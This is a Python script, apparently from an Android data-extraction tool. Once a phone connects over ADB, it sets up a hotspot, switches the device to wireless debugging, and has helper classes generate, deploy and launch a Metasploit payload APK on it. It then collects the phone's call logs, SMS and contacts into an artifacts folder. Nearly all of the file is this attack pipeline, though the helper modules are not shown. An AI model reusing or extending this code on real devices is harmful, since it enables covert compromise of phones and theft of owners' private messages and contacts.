#from .extraction import AdbHandler, HotspotHandler, LogHandler, MsfHandler, DEPENDENCY_PATH, ARTIFACTS_PATH
import time
import os
import json

def execute_script(x: str):
    """
    This function executes as if its a script. Ashwanth you can move this to a file and run it as a script
    in any way you like 
    """
    if (x == "Device Connected"):
        # start the hotspot
        hotspothandler = HotspotHandler.HotspotHandler()
        hotspothandler.create_network_interface()
        adb_handler.send_wifi_payload()
        adb_handler.connect_to_wifi()
        time.sleep(1)
        #Keep on checking if a device is connected to the hotspot using ping
        while True:
            code, output = adb_handler.command_handler.executeCommand(["ping", "-c", "1", hotspothandler.device_ip])
            if code == 0:
                LogHandler.LogHandler().logMessage("Device connected to hotspot under IP 10.42.0.228")
                break
            time.sleep(2)
        # send a go to home action to close the app on screen
        adb_handler.go_home()
        # send another go honme action to send us to the main home screen
        adb_handler.go_home()
        # Get Basic Device Info so that UI can start running
        adb_handler.get_device_info()
        # switch over to wireless debugging
        adb_handler.switch_to_wifi_debugging(hotspothandler.device_ip)
        # create metasploit instance
        metasploit_handler = MsfHandler.MsfHandler()
        # generate the metasploit payload apk
        metasploit_handler.generate_payload(hotspothandler.server_ip)
        # deploy the exploit to the android device
        adb_handler.deploy_exploit() 
        #launch the exploit
        metasploit_handler.launch_exploit(hotspothandler.server_ip)
        # Copy the exported call logs and sms to our artifacts folder
        for file in os.listdir(DEPENDENCY_PATH):
            if file.startswith("calllog") or file.startswith("sms"):
                os.rename(DEPENDENCY_PATH+file, ARTIFACTS_PATH+file)
        # run adb command to get contacts
        adb_handler.get_contacts()
        #move the contacts file to our artifacts fold
        os.rename(DEPENDENCY_PATH+"contacts.txt", ARTIFACTS_PATH+"contacts.txt")  
        # update the JSON file that we have synced all data
        json_file = json.load(open(ARTIFACTS_PATH+"device_info.json"))
        json_file["call_logs"] = True
        json_file["sms"] = True
        json_file["contacts"] = True
        json.dump(json_file, open(ARTIFACTS_PATH+"device_info.json", "w"))
        LogHandler.LogHandler().logMessage("All data synced")
           
        
# start the adb server
# adb_handler = AdbHandler.AdbHandler()
# adb_handler.start_server()
# time.sleep(2)
# # notify if a device is connected
# adb_handler.notify_if_device_connected(execute_script)

def start_payload():
    print("Extraction goes here")
    return {"key":"value"}
